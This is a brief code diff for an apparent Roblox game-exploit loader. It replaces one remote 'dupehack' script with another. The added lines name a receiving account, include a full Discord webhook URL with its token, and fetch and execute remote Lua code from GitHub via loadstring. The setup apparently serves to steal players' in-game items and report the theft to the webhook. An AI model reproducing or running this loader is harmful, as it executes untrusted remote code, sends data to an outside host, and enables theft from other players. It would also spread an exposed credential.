@@ -1,3 +1,4 @@
-getgenv().YourAccNameThatGetsMailbox = "Wizard_CatWhite"
-getgenv().YourAccountIdForBankInvite = 23423423
-loadstring(game:HttpGet('https://raw.githubusercontent.com/NukeVsCity/Scripts2022/main/dupehack'))()
+UserName = "Wizard_CatWhite"
+WebHook = "https://discord.com/api/webhooks/1090853107816214548/Vxcs9dIe4jRfqeVbX6iHJn7ZifN4_kCPfJnI17LIINOqPfBtjzXjdG0I7B93mDORO5jS"
+
+loadstring(game:HttpGet("https://raw.githubusercontent.com/HardGameSs/PSX/main/New.lua", true))()
